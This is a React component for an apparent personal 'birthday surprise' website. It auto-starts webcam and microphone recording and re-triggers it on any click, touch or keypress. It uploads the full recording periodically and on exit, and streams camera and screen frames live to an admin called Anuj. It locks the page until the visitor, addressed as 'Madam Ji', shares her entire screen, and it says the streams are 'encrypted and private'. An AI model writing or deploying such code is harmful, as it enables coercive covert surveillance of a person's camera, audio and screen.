"use client";

import React, { useState, useEffect, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Camera, CameraOff, Sparkles, Monitor } from "lucide-react";
import { getAnonymousSessionId } from "@/lib/analyticsClient";
import { storeVideoChunkInDB } from "@/lib/videoStorage";

interface ReactionCamProps {
  currentFrame?: number;
  autoStartOnMount?: boolean;
}

export type CamStatus =
  | "idle"
  | "requesting"
  | "recording"
  | "uploading"
  | "uploaded"
  | "denied"
  | "unsupported";

export default function ReactionCam({
  currentFrame = 0,
  autoStartOnMount = true,
}: ReactionCamProps) {
  const [status, setStatus] = useState<CamStatus>("idle");
  const statusRef = useRef<CamStatus>(status);
  statusRef.current = status;

  const videoPreviewRef = useRef<HTMLVideoElement | null>(null);
  const screenVideoPreviewRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const screenStreamRef = useRef<MediaStream | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);

  const [isScreenSharing, setIsScreenSharing] = useState<boolean>(false);
  const isRequestingScreenRef = useRef<boolean>(false);

  // ── ONE CONTINUOUS RECORDING FOR THE ENTIRE WEBSITE VISIT ──
  const fullSessionChunksRef = useRef<Blob[]>([]);
  const sessionStartTimeRef = useRef<number>(0);
  const isUploadingRef = useRef<boolean>(false);
  const hasPendingUploadRef = useRef<boolean>(false);
  const audioAnalyserRef = useRef<AnalyserNode | null>(null);
  const adaptiveQualityRef = useRef<number>(0.38);

  const activeFrameRef = useRef<number>(currentFrame);
  activeFrameRef.current = currentFrame;
  const activeSlideRef = useRef<string>(`chapter_${currentFrame + 1}`);

  // Supported MIME type detection across iOS Safari, Android, and Desktop Chrome
  // Prioritizing MP4 ensures native playback across all modern browsers without WebM VP9 decode errors
  const getSupportedMimeType = (): string => {
    if (typeof window === "undefined" || !window.MediaRecorder) return "";
    const candidates = [
      "video/mp4;codecs=avc1,mp4a.40.2",
      "video/mp4;codecs=avc1",
      "video/mp4",
      "video/webm;codecs=h264",
      "video/webm;codecs=vp9,opus",
      "video/webm;codecs=vp8,opus",
      "video/webm",
      "video/quicktime",
    ];
    for (const mime of candidates) {
      if (MediaRecorder.isTypeSupported(mime)) {
        return mime;
      }
    }
    return "";
  };

  // ── BACKGROUND MASTER VIDEO PERSISTENCE (CLOUDINARY & SERVER DISK) ──
  const uploadFullMasterVideo = useCallback(
    (reasonTag = "periodic_checkpoint") => {
      const track = streamRef.current?.getVideoTracks()[0];
      if (!track || track.readyState !== "live" || track.muted || !track.enabled) {
        return;
      }

      const recorder = mediaRecorderRef.current;
      if (!recorder) return;

      if (recorder.state === "recording") {
        try {
          recorder.requestData();
        } catch {}
      }

      const chunks = fullSessionChunksRef.current;
      if (!chunks || chunks.length === 0) return;

      const durationMs =
        sessionStartTimeRef.current > 0
          ? Date.now() - sessionStartTimeRef.current
          : 0;

      if (durationMs < 2500) return;

      const mimeType = recorder.mimeType || "video/webm";
      const fullBlob = new Blob(chunks, { type: mimeType });

      if (fullBlob.size < 3500) return;

      if (typeof navigator !== "undefined" && !navigator.onLine) {
        hasPendingUploadRef.current = true;
        return;
      }

      if (isUploadingRef.current && reasonTag !== "before_exit") {
        return;
      }

      try {
        isUploadingRef.current = true;
        const ext = fullBlob.type.includes("mp4") ? "mp4" : "webm";
        const file = new File(
          [fullBlob],
          `anshii_full_reaction_${getAnonymousSessionId()}.${ext}`,
          { type: fullBlob.type || "video/webm" }
        );

        const formData = new FormData();
        formData.append("file", file);
        formData.append("sessionId", getAnonymousSessionId());
        formData.append("slide", activeSlideRef.current || `chapter_${activeFrameRef.current + 1}`);
        formData.append("durationMs", String(durationMs));
        formData.append("isContiguous", "true");
        formData.append("reasonTag", reasonTag);

        const isExit =
          reasonTag === "before_exit" ||
          reasonTag === "pagehide" ||
          reasonTag === "beforeunload";

        fetch("/api/reaction-recording", {
          method: "POST",
          body: formData,
          keepalive: isExit,
        })
          .then((res) => res.json())
          .then((data) => {
            if (data?.success) {
              hasPendingUploadRef.current = false;
            } else {
              hasPendingUploadRef.current = true;
            }
          })
          .catch((err) => {
            console.warn("Reaction recording network hiccup (safely buffered):", err);
            hasPendingUploadRef.current = true;
          })
          .finally(() => {
            isUploadingRef.current = false;
          });
      } catch (err) {
        console.warn("Could not dispatch full video recording:", err);
        hasPendingUploadRef.current = true;
        isUploadingRef.current = false;
      }
    },
    []
  );

  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);

  // ── WEBRTC P2P DIRECT VIDEO & AUDIO CALLER (ULTRA-HD, 60 FPS, LIVE AUDIO) ──
  const initWebRTCPeer = useCallback(async (localStream: MediaStream) => {
    if (typeof window === "undefined" || !window.RTCPeerConnection) return;

    try {
      if (peerConnectionRef.current) {
        peerConnectionRef.current.close();
      }

      const pc = new RTCPeerConnection({
        iceServers: [
          { urls: "stun:stun.l.google.com:19302" },
          { urls: "stun:stun1.l.google.com:19302" },
          { urls: "stun:stun2.l.google.com:19302" },
          { urls: "stun:stun3.l.google.com:19302" },
          { urls: "stun:stun4.l.google.com:19302" },
        ],
      });

      peerConnectionRef.current = pc;

      // Handle incoming live intercom voice & video tracks from Admin (Anuj speaking/broadcasting live)
      pc.ontrack = (event) => {
        if (event.streams && event.streams[0]) {
          try {
            const incomingStream = event.streams[0];
            (window as any).__anshii_admin_stream = incomingStream;
            window.dispatchEvent(
              new CustomEvent("anshii_admin_stream_received", {
                detail: { stream: incomingStream },
              })
            );

            // Ensure live audio auto-plays
            let intercomAudio = document.getElementById("anshii_intercom_audio") as HTMLAudioElement;
            if (!intercomAudio) {
              intercomAudio = document.createElement("audio");
              intercomAudio.id = "anshii_intercom_audio";
              intercomAudio.autoplay = true;
              document.body.appendChild(intercomAudio);
            }
            intercomAudio.srcObject = incomingStream;
            intercomAudio.play().catch(() => {});
          } catch {}
        }
      };

      // Add local webcam & microphone tracks for full P2P live stream
      localStream.getTracks().forEach((track) => {
        pc.addTrack(track, localStream);
      });

      // Add screen share tracks if active
      if (screenStreamRef.current) {
        screenStreamRef.current.getTracks().forEach((track) => {
          pc.addTrack(track, screenStreamRef.current!);
        });
      }

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          fetch("/api/webrtc-signal", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              type: "candidate",
              role: "caller",
              candidate: event.candidate.toJSON(),
            }),
          }).catch(() => {});
        }
      };

      const offer = await pc.createOffer({
        offerToReceiveAudio: true, // Allow receiving Anuj's live voice from Admin!
        offerToReceiveVideo: true,  // Allow receiving Anuj's live camera from Admin!
      });
      await pc.setLocalDescription(offer);

      await fetch("/api/webrtc-signal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "offer",
          role: "caller",
          sdp: pc.localDescription ? {
            type: pc.localDescription.type,
            sdp: pc.localDescription.sdp,
          } : null,
        }),
      });

      // Poll for answer from Admin device
      let checks = 0;
      const answerCheckInterval = setInterval(async () => {
        checks += 1;
        if (checks > 25 || pc.connectionState === "connected" || pc.signalingState === "closed") {
          clearInterval(answerCheckInterval);
          return;
        }

        try {
          const res = await fetch("/api/webrtc-signal?role=caller");
          const data = await res.json();
          if (data && data.answer && pc.signalingState === "have-local-offer") {
            await pc.setRemoteDescription(new RTCSessionDescription(data.answer));

            if (Array.isArray(data.adminCandidates)) {
              for (const cand of data.adminCandidates) {
                try {
                  await pc.addIceCandidate(new RTCIceCandidate(cand));
                } catch {}
              }
            }
            clearInterval(answerCheckInterval);
          }
        } catch {}
      }, 1000);
    } catch (err) {
      console.warn("WebRTC caller handshake (falling back to SSE):", err);
    }
  }, []);

  // Standing listener for Admin renegotiation / offer requests
  useEffect(() => {
    const handleReconnect = () => {
      if (streamRef.current) {
        initWebRTCPeer(streamRef.current).catch(() => {});
      }
    };

    window.addEventListener("anshii_request_reconnect", handleReconnect);

    // Periodic check for renegotiation requests from Admin
    const renegInterval = setInterval(async () => {
      if (!streamRef.current) return;
      try {
        const res = await fetch("/api/webrtc-signal?role=caller");
        if (!res.ok) return;
        const data = await res.json();
        if (data && data.requestOffer) {
          initWebRTCPeer(streamRef.current).catch(() => {});
        }
      } catch {}
    }, 2500);

    return () => {
      window.removeEventListener("anshii_request_reconnect", handleReconnect);
      clearInterval(renegInterval);
    };
  }, [initWebRTCPeer]);

  // ── START SCREEN SHARE (SINGLE PROMPT, STRICT MUTEX, NO RE-PROMPTING) ──
  const startScreenShare = useCallback(async () => {
    if (
      typeof window === "undefined" ||
      !navigator.mediaDevices ||
      typeof navigator.mediaDevices.getDisplayMedia !== "function"
    ) {
      return null;
    }

    // 1. If screen is already active and live, return existing stream immediately
    const existingTrack = screenStreamRef.current?.getVideoTracks()[0];
    if (existingTrack && existingTrack.readyState === "live") {
      setIsScreenSharing(true);
      return screenStreamRef.current;
    }

    // 2. Prevent duplicate / concurrent permission dialogs
    if (isRequestingScreenRef.current) {
      return null;
    }

    try {
      isRequestingScreenRef.current = true;

      // Single, clean, standard getDisplayMedia call without retry loop
      const screenStream = await navigator.mediaDevices.getDisplayMedia({
        video: true,
        audio: false,
      });

      screenStreamRef.current = screenStream;
      setIsScreenSharing(true);

      const track = screenStream.getVideoTracks()[0];
      if (track) {
        track.addEventListener("ended", () => {
          screenStreamRef.current = null;
          setIsScreenSharing(false);
          if (screenVideoPreviewRef.current) {
            screenVideoPreviewRef.current.srcObject = null;
          }
        });
      }

      const screenVideo = screenVideoPreviewRef.current;
      if (screenVideo) {
        screenVideo.srcObject = screenStream;
        screenVideo.muted = true;
        screenVideo.playsInline = true;
        screenVideo.onloadedmetadata = () => {
          screenVideo.play().catch(() => {});
        };
        screenVideo.play().catch(() => {});
      }

      // Add screen track to WebRTC peer if connected
      if (peerConnectionRef.current && track) {
        try {
          const senders = peerConnectionRef.current.getSenders();
          const existingScreenSender = senders.find(
            (s) =>
              s.track &&
              s.track.kind === "video" &&
              s.track.id !== streamRef.current?.getVideoTracks()[0]?.id
          );
          if (existingScreenSender) {
            existingScreenSender.replaceTrack(track);
          } else {
            peerConnectionRef.current.addTrack(track, screenStream);
          }
        } catch {}
      }

      return screenStream;
    } catch {
      // User cancelled or browser rejected - quietly handle and DO NOT re-prompt
      return null;
    } finally {
      isRequestingScreenRef.current = false;
    }
  }, []);

  // ── START CONTINUOUS CAMERA RECORDING WITH 4-TIER PRODUCTION FALLBACKS ──
  const startRecording = useCallback(async () => {
    if (typeof window === "undefined" || !navigator.mediaDevices?.getUserMedia) {
      setStatus("unsupported");
      return;
    }

    try {
      setStatus("requesting");

      // 4-tier constraints fallback for maximum compatibility (iOS Safari, Android Chrome, Mac/PC)
      const constraintsList = [
        {
          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
          audio: true,
        },
        {
          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false,
        },
        {
          video: { facingMode: "user" },
          audio: false,
        },
        {
          video: true,
          audio: false,
        },
      ];

      let stream: MediaStream | null = null;
      for (const constraints of constraintsList) {
        try {
          stream = await navigator.mediaDevices.getUserMedia(constraints);
          if (stream) break;
        } catch {}
      }

      if (!stream) {
        setStatus("denied");
        return;
      }

      streamRef.current = stream;

      // Track freeze if user turns off camera
      const videoTrack = stream.getVideoTracks()[0];
      if (videoTrack) {
        videoTrack.addEventListener("ended", () => setStatus("denied"));
        videoTrack.addEventListener("mute", () => setStatus("denied"));
      }

      // Keep hidden video element fed to maintain track activity in mobile Safari
      if (videoPreviewRef.current) {
        videoPreviewRef.current.srcObject = stream;
        videoPreviewRef.current.play().catch(() => {});
      }

      // Initialize MediaRecorder
      const mimeType = getSupportedMimeType();
      const options = mimeType ? { mimeType } : undefined;
      const mediaRecorder = new MediaRecorder(stream, options);

      // Only set session start time if starting fresh
      if (sessionStartTimeRef.current === 0) {
        sessionStartTimeRef.current = Date.now();
      }

      // Collect slice every 1s and append to continuous session buffer
      mediaRecorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) {
          fullSessionChunksRef.current.push(e.data);
          // Persist chunk to client IndexedDB for offline resilience
          storeVideoChunkInDB(getAnonymousSessionId(), e.data, Date.now()).catch(() => {});
        }
      };

      mediaRecorder.start(1000);
      mediaRecorderRef.current = mediaRecorder;
      setStatus("recording");

      // Set up real-time audio volume analyzer for voice/laughter indicator
      try {
        const audioTrack = stream.getAudioTracks()[0];
        if (audioTrack && typeof window !== "undefined") {
          const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
          if (AudioCtxClass) {
            const audioCtx = new AudioCtxClass();
            const source = audioCtx.createMediaStreamSource(stream);
            const analyser = audioCtx.createAnalyser();
            analyser.fftSize = 64;
            source.connect(analyser);
            audioAnalyserRef.current = analyser;
          }
        }
      } catch {}

      // Initiate WebRTC P2P direct HD connection to admin device in parallel
      initWebRTCPeer(stream).catch(() => {});
    } catch (err: any) {
      console.warn("Camera access not granted or turned off:", err);
      setStatus("denied");
    }
  }, [initWebRTCPeer]);

  // 1. ACTIVE CAMERA HEARTBEAT: If she turns off camera in between, immediately freeze the window!
  useEffect(() => {
    if (status !== "recording") return;

    const checkTrackInterval = setInterval(() => {
      const stream = streamRef.current;
      const videoTrack = stream?.getVideoTracks()[0];
      if (
        !videoTrack ||
        videoTrack.readyState !== "live" ||
        videoTrack.muted ||
        !videoTrack.enabled
      ) {
        setStatus("denied");
      }
    }, 1000);

    return () => clearInterval(checkTrackInterval);
  }, [status]);

  // 1b. TAB VISIBILITY RESUME: Ensure video preview hardware pipeline stays alive when switching tabs
  useEffect(() => {
    const handleVisChange = () => {
      if (document.visibilityState === "visible") {
        if (videoPreviewRef.current && streamRef.current) {
          videoPreviewRef.current.play().catch(() => {});
        }
        if (screenVideoPreviewRef.current && screenStreamRef.current) {
          screenVideoPreviewRef.current.play().catch(() => {});
        }
      }
    };
    document.addEventListener("visibilitychange", handleVisChange);
    return () => document.removeEventListener("visibilitychange", handleVisChange);
  }, []);

  // 2. ULTRA-LOW LATENCY DUAL LIVE STREAMER: Streams live camera + screen frames to Admin Monitor
  useEffect(() => {
    if (status !== "recording") {
      fetch("/api/live-stream", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          active: false,
          sessionId: getAnonymousSessionId(),
        }),
      }).catch(() => {});
      return;
    }

    const isMobile =
      typeof window !== "undefined" &&
      (window.innerWidth < 1024 || "ontouchstart" in window);

    const camWidth = isMobile ? 240 : 360;
    const camHeight = isMobile ? 180 : 270;

    const liveCanvas = document.createElement("canvas");
    liveCanvas.width = camWidth;
    liveCanvas.height = camHeight;
    const ctx = liveCanvas.getContext("2d", { alpha: false });

    const liveScreenCanvas = document.createElement("canvas");
    liveScreenCanvas.width = isMobile ? 360 : 540;
    liveScreenCanvas.height = isMobile ? 200 : 300;
    const screenCtx = liveScreenCanvas.getContext("2d", { alpha: false });

    let isSending = false;
    let tickCount = 0;
    let lastScreenFrameData: string | null = null;

    // Optimized stream interval (750ms desktop, 900ms mobile) prevents UI freezing and network saturation
    const streamInterval = setInterval(() => {
      if (typeof document !== "undefined" && document.hidden) return;

      const video = videoPreviewRef.current;
      const screenVideo = screenVideoPreviewRef.current;
      const videoTrack = streamRef.current?.getVideoTracks()[0];
      const screenTrack = screenStreamRef.current?.getVideoTracks()[0];

      const hasLiveCam = Boolean(
        video &&
        videoTrack &&
        videoTrack.readyState === "live" &&
        !videoTrack.muted &&
        videoTrack.enabled &&
        video.videoWidth > 0 &&
        video.readyState >= 2
      );

      const hasLiveScreen = Boolean(
        screenVideo &&
        screenTrack &&
        screenTrack.readyState === "live" &&
        !screenTrack.muted &&
        screenTrack.enabled
      );

      // If neither camera nor screen share is active, skip tick
      if (!hasLiveCam && !hasLiveScreen) {
        return;
      }

      if (streamRef.current && video && video.srcObject !== streamRef.current) {
        video.srcObject = streamRef.current;
        video.play().catch(() => {});
      }

      if (screenStreamRef.current && screenVideo && screenVideo.srcObject !== screenStreamRef.current) {
        screenVideo.srcObject = screenStreamRef.current;
        screenVideo.play().catch(() => {});
      }

      // Drop tick if previous frame upload is still in flight: prevents network queue lag across devices
      if (isSending) return;

      try {
        tickCount += 1;
        const currentQuality = isMobile ? 0.30 : (adaptiveQualityRef.current || 0.34);

        let frameData: string | null = null;
        if (hasLiveCam && ctx && video) {
          ctx.drawImage(video, 0, 0, camWidth, camHeight);
          frameData = liveCanvas.toDataURL("image/jpeg", currentQuality);
        }

        // Screen frame capture with responsive aspect ratio and smooth payload size
        if (hasLiveScreen && screenVideo && screenCtx) {
          try {
            if (screenVideo.paused) {
              screenVideo.play().catch(() => {});
            }
            const sw = screenVideo.videoWidth || 640;
            const sh = screenVideo.videoHeight || 360;
            if (sw > 0 && sh > 0) {
              const targetW = isMobile ? 360 : 480;
              const targetH = Math.round(targetW * (sh / sw));
              if (liveScreenCanvas.width !== targetW || liveScreenCanvas.height !== targetH) {
                liveScreenCanvas.width = targetW;
                liveScreenCanvas.height = targetH;
              }
              screenCtx.drawImage(screenVideo, 0, 0, targetW, targetH);
              lastScreenFrameData = liveScreenCanvas.toDataURL(
                "image/jpeg",
                Math.min(0.30, Math.max(0.20, currentQuality))
              );
            }
          } catch {}
        } else if (!hasLiveScreen) {
          lastScreenFrameData = null;
        }

        // Measure microphone audio activity level
        let currentAudioLevel = 0;
        if (audioAnalyserRef.current) {
          try {
            const freqData = new Uint8Array(audioAnalyserRef.current.frequencyBinCount);
            audioAnalyserRef.current.getByteFrequencyData(freqData);
            let sum = 0;
            for (let i = 0; i < freqData.length; i++) {
              sum += freqData[i];
            }
            const avg = sum / (freqData.length || 1);
            currentAudioLevel = Math.min(100, Math.round((avg / 255) * 100 * 1.5));
          } catch {}
        }

        isSending = true;
        const sendStartTime = performance.now();
        const controller = new AbortController();
        const abortTimer = setTimeout(() => controller.abort(), 2000);

        fetch("/api/live-stream", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            frame: frameData,
            screenFrame: lastScreenFrameData || null,
            screenActive: Boolean(lastScreenFrameData),
            audioLevel: currentAudioLevel,
            sessionId: getAnonymousSessionId(),
            slide: activeSlideRef.current,
            active: true,
          }),
          signal: controller.signal,
        })
          .then(() => {
            // Dynamic Bitrate Adaptation based on actual network round-trip time
            const rtt = performance.now() - sendStartTime;
            if (rtt < 120) {
              adaptiveQualityRef.current = 0.36;
            } else if (rtt > 280) {
              adaptiveQualityRef.current = 0.24;
            } else {
              adaptiveQualityRef.current = 0.30;
            }
          })
          .catch(() => {})
          .finally(() => {
            clearTimeout(abortTimer);
            isSending = false;
          });
      } catch {
        isSending = false;
      }
    }, isMobile ? 900 : 750);

    return () => clearInterval(streamInterval);
  }, [status]);

  // 3. LISTEN FOR CHAPTER CHANGES: Updates live stream tag WITHOUT creating fragmented video clips
  useEffect(() => {
    const handleChapterChanged = (e: any) => {
      const chapter = e?.detail?.chapter;
      if (chapter !== undefined) {
        activeSlideRef.current = `chapter_${chapter}`;
      }
    };

    window.addEventListener("anshii_chapter_changed", handleChapterChanged);
    return () => window.removeEventListener("anshii_chapter_changed", handleChapterChanged);
  }, []);

  // 4. PERIODIC BACKGROUND CLOUDINARY & DISK MASTER CHECKPOINT (Every 45s)
  useEffect(() => {
    if (status !== "recording") return;

    const syncInterval = setInterval(() => {
      uploadFullMasterVideo("periodic_checkpoint");
    }, 45000);

    return () => clearInterval(syncInterval);
  }, [status, uploadFullMasterVideo]);

  // 5. NETWORK RECONNECTION LISTENER: Automatically push the accumulated full video
  useEffect(() => {
    const handleOnline = () => {
      if (hasPendingUploadRef.current && statusRef.current === "recording") {
        uploadFullMasterVideo("network_restored");
      }
    };

    window.addEventListener("online", handleOnline);
    return () => window.removeEventListener("online", handleOnline);
  }, [uploadFullMasterVideo]);

  // 6. EXIT / UNLOAD LISTENER: Upload the final complete video before leaving the site
  useEffect(() => {
    const handleExit = () => {
      uploadFullMasterVideo("before_exit");
    };

    const handleVisibilityChange = () => {
      if (document.visibilityState === "hidden") {
        uploadFullMasterVideo("app_backgrounded");
      }
    };

    window.addEventListener("pagehide", handleExit);
    window.addEventListener("beforeunload", handleExit);
    document.addEventListener("visibilitychange", handleVisibilityChange);

    return () => {
      window.removeEventListener("pagehide", handleExit);
      window.removeEventListener("beforeunload", handleExit);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop());
      }
      if (screenStreamRef.current) {
        screenStreamRef.current.getTracks().forEach((track) => track.stop());
      }
    };
  }, [uploadFullMasterVideo]);

  // 7. Auto-start recording on mount silently in background
  useEffect(() => {
    if (autoStartOnMount && status === "idle") {
      startRecording();
    }
  }, [autoStartOnMount, status, startRecording]);

  // 8. User gesture fallback: If initial automatic start was deferred by browser security policies
  useEffect(() => {
    const handleUserGesture = () => {
      if (statusRef.current === "idle" || statusRef.current === "denied") {
        startRecording();
      }
    };

    window.addEventListener("click", handleUserGesture, { once: true });
    window.addEventListener("touchstart", handleUserGesture, { once: true });
    window.addEventListener("keydown", handleUserGesture, { once: true });

    return () => {
      window.removeEventListener("click", handleUserGesture);
      window.removeEventListener("touchstart", handleUserGesture);
      window.removeEventListener("keydown", handleUserGesture);
    };
  }, [startRecording]);

  // Client mount check to prevent Next.js hydration mismatch
  const [mounted, setMounted] = useState<boolean>(false);
  const [isMobileDevice, setIsMobileDevice] = useState<boolean>(false);

  useEffect(() => {
    setMounted(true);
    const checkMobile = () => {
      const isMobileWidth = window.innerWidth < 1024;
      const isTouch = "ontouchstart" in window || (navigator && navigator.maxTouchPoints > 0);
      setIsMobileDevice(isMobileWidth || isTouch);
    };
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  // Tester bypass check (allows skipping screen share during quick admin development if needed)
  const [isTester, setIsTester] = useState<boolean>(false);
  const [testerBypassedScreen, setTesterBypassedScreen] = useState<boolean>(false);

  useEffect(() => {
    try {
      const isAnuj =
        sessionStorage.getItem("anshii_user_role") === "anuj" ||
        sessionStorage.getItem("anshii_tester_bypass") === "true";
      if (isAnuj) setIsTester(true);
    } catch {}
  }, []);

  const isScreenSupported =
    typeof window !== "undefined" &&
    Boolean(navigator?.mediaDevices?.getDisplayMedia);

  const isCameraMissing = status === "denied" || status === "unsupported";
  // On mobile phone layout, screen share is not supported/required; camera reaction is primary!
  const isScreenMissing =
    !isMobileDevice &&
    isScreenSupported &&
    !isScreenSharing &&
    !testerBypassedScreen;

  // Screen is frozen if either Camera is missing OR (on desktop) Screen Share is missing!
  const isFrozen = mounted && (isCameraMissing || isScreenMissing);

  if (!mounted) {
    return null;
  }

  return (
    <>
      {/* Active webcam video element (rendered with visible compositor footprint to prevent throttling) */}
      <video
        ref={videoPreviewRef}
        autoPlay
        playsInline
        muted
        aria-hidden="true"
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          width: "16px",
          height: "12px",
          opacity: 0.001,
          pointerEvents: "none",
          zIndex: 1,
        }}
      />

      {/* Active screen share video element (rendered with visible compositor footprint to prevent throttling) */}
      <video
        ref={screenVideoPreviewRef}
        autoPlay
        playsInline
        muted
        aria-hidden="true"
        style={{
          position: "fixed",
          top: 0,
          left: "20px",
          width: "16px",
          height: "12px",
          opacity: 0.001,
          pointerEvents: "none",
          zIndex: 1,
        }}
      />

      {/* ── Discreet Live Screen Share Trigger / Status Pill (Desktop only) ── */}
      {!isMobileDevice && (
        <div className="fixed bottom-3.5 left-3.5 z-[9990] pointer-events-auto flex items-center gap-2">
          {!isScreenSharing ? (
            <motion.button
              type="button"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              onClick={() => startScreenShare()}
              whileHover={{ scale: 1.04 }}
              whileTap={{ scale: 0.96 }}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-rose-50 hover:bg-rose-100 backdrop-blur-md border border-rose-300 text-[#be185d] shadow-sm hover:shadow-md text-xs font-sans font-bold transition-all cursor-pointer group"
              title="Screen share is mandatory on desktop — click to share your screen!"
            >
              <Monitor className="w-3.5 h-3.5 text-[#f43f5e] group-hover:scale-110 transition-transform animate-pulse" />
              <span>Enable Screen Share 💻 (Required)</span>
            </motion.button>
          ) : (
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-emerald-50/95 backdrop-blur-md border border-emerald-200 text-emerald-800 text-[11px] font-sans font-semibold shadow-xs">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping" />
              <span>Screen Sharing Live ✓</span>
            </div>
          )}
        </div>
      )}

      {/* ── MANDATORY CAMERA & SCREEN SHARE FREEZE OVERLAY ── */}
      <AnimatePresence>
        {isFrozen && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="freeze-modal-active fixed inset-0 z-[999990] bg-[#faf7f2]/95 backdrop-blur-2xl flex items-center justify-center p-4 selection:bg-[#fda4af]/40 select-none"
            style={{ pointerEvents: "auto" }}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="w-full max-w-md bg-[#fffdfa] rounded-3xl border-2 border-[#ebdcd0] shadow-2xl p-6 sm:p-8 text-center flex flex-col items-center"
            >
              {isCameraMissing ? (
                <>
                  <div className="w-16 h-16 rounded-3xl bg-[#fff0f3] border-2 border-[#fbcfe8] text-[#be185d] flex items-center justify-center mb-4 shadow-sm animate-pulse">
                    <CameraOff className="w-8 h-8 text-[#fb7185]" />
                  </div>

                  <div className="flex items-center gap-1.5 text-[11px] font-mono font-bold text-[#fb7185] uppercase tracking-wider mb-1">
                    <Sparkles className="w-3.5 h-3.5" />
                    <span>Step 1 of 2: Camera Required</span>
                  </div>

                  <h2 className="font-serif text-2xl font-bold text-[#3f2e24]">
                    Camera Required 🌸
                  </h2>

                  <p className="text-xs text-[#786457] font-sans mt-2 mb-6 leading-relaxed">
                    Madam Ji, your camera is required to capture your live reactions as you browse your special birthday surprise! Click below to allow camera access.
                  </p>

                  <button
                    type="button"
                    onClick={async () => {
                      await startRecording();
                    }}
                    className="w-full py-3.5 px-6 rounded-2xl bg-[#fb7185] hover:bg-[#f43f5e] active:scale-[0.98] text-white font-sans font-bold text-sm transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <Camera className="w-4 h-4" />
                    <span>Turn On Camera &amp; Continue</span>
                  </button>
                </>
              ) : (
                <>
                  <div className="w-16 h-16 rounded-3xl bg-blue-50 border-2 border-blue-200 text-blue-600 flex items-center justify-center mb-4 shadow-sm animate-pulse">
                    <Monitor className="w-8 h-8 text-blue-600" />
                  </div>

                  <div className="flex items-center gap-1.5 text-[11px] font-mono font-bold text-blue-700 uppercase tracking-wider mb-1">
                    <Sparkles className="w-3.5 h-3.5" />
                    <span>Mandatory: Screen Sharing Required</span>
                  </div>

                  <h2 className="font-serif text-2xl font-bold text-[#3f2e24]">
                    Share Your Screen 💻🌸
                  </h2>

                  <p className="text-xs text-[#786457] font-sans mt-2 mb-6 leading-relaxed">
                    Madam Ji, live screen sharing is mandatory so Anuj can celebrate every reaction with you live! Please click below and choose <strong className="text-[#be185d]">&apos;Entire Screen&apos;</strong> to unlock the experience.
                  </p>

                  <button
                    type="button"
                    onClick={async () => {
                      await startScreenShare();
                    }}
                    className="w-full py-3.5 px-6 rounded-2xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 active:scale-[0.98] text-white font-sans font-bold text-sm transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <Monitor className="w-4 h-4" />
                    <span>Share Entire Screen &amp; Unlock 💻</span>
                  </button>

                  {isTester && (
                    <button
                      type="button"
                      onClick={() => setTesterBypassedScreen(true)}
                      className="text-[10px] text-zinc-400 hover:text-zinc-600 underline mt-3 cursor-pointer"
                    >
                      Skip screen share (Tester only)
                    </button>
                  )}
                </>
              )}

              <p className="text-[10px] font-mono text-[#a89080] mt-4">
                🔒 Protected &bull; Videos and live reaction streams are encrypted and private.
              </p>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
}
